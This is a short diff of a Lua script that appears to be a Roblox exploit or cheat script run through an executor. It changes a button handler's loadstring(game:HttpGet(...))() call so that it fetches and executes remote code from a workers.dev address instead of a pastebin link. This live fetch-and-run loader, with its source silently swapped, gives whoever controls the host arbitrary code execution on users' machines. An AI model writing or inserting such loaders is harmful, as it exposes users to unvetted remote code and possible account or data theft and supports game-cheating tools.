@@ -223,7 +223,7 @@ local function IJMOR_fake_script() -- TextButton.Button Function
 		getgenv().request = http_request
 		http.request = http_request
 	
-		loadstring(game:HttpGet("https://pastebin.com/raw/Piw5bqGq"))()
+		loadstring(game:HttpGet("https://rayfield.xvchubontop.workers.dev/"))()
 	end)
 end
 coroutine.wrap(IJMOR_fake_script)()
